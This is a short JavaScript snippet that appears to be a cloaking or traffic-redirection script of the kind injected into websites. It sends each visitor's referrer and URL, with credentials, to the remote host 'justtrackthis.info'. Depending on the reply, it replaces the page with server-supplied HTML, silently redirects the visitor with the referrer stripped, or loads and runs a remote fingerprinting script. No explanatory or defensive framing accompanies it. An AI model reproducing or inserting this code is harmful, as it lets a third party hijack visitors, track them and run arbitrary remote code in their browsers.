(function() {
if (window.location.href.search("[?&]_novisit=on") != -1) return;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", "https://justtrackthis.info/_remote_track?campaign=" + escape("4XFEnKq46Q") + "&referrer=" + escape(document.referrer) + "&uri=" + escape(window.location.href), true);
xhr.onload = function() {
    if (xhr.status !== 200) return;
    if (xhr.getResponseHeader("Struct-Response") !== "true") {
        document.open();
        document.write(xhr.responseText);
        document.close();
        return;
    }
    var resp = JSON.parse(xhr.responseText);
    if (resp.result === "redirect") {
        document.open();
        document.write('<html><head>');
        document.write('<meta name="referrer" content="never" />');
        document.write('<meta http-equiv="refresh" content="0; url='+resp.redirect_url+'" />');
        document.write('</head></html>');
        document.close();
        return;
    }
    if (resp.result === "fp") {
        var cb = function() {
            fp.init(resp.fp.data_url, "", resp.fp.checks, true);
        };
        var ref = document.getElementsByTagName("script")[0];
        var script = document.createElement("script");
        script.type = "text/javascript";
        if (script.readyState) {  //IE
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    cb();
                }
            };
        } else {
            script.onload = cb;
        }
        script.src = resp.fp.script_url;
        ref.parentNode.insertBefore(script, ref);
        return
    }
};
xhr.send();
})();

